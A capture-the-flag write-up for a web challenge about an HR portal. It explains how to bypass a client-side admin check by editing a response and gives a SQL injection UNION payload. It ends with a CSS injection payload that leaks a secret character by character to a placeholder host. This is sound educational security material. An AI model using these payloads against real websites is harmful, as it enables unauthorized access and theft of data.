# [web] HR portal

> **Category:** `web`  
> **CTF:** KubSTU CTF 2026 Spring

---

Challenge description:
Every specialist knows: the most important person in the company isn't the director, but the HR. They decide your fate and hand over the coveted offer letter. Explore our new portal and uncover the HR manager's secrets.

Writeup:

Register and log into the portal.
Examine the JS or the requests.
One of the requests is api/user-info, which handles user permissions. But the protection is only implemented on the client side. So it can be bypassed in various ways. The simplest is to change the is_admin value in the response from 0 to 1.

Two new buttons appear.
In "Get Promotion" there's the final form for entering the secret and obtaining the flag. Also in the page source, there's a small hint for constructing the future CSS payload.
In the second button "Open Admin Panel", we see a settings search that is vulnerable to SQLi.
Using SQL injection, we extract the attribute value that we'll also need for constructing the CSS injection:  ' UNION SELECT setting_value FROM admin_settings WHERE setting_name='secret_field_name' -- -

In the end, we get approximately this payload:  .admin-secret-key[data-hr_secret_key_f5g4^="A"] { background-image: url("http://YOUR_URL?char=A" ); }

Then we use the key to obtain the flag.
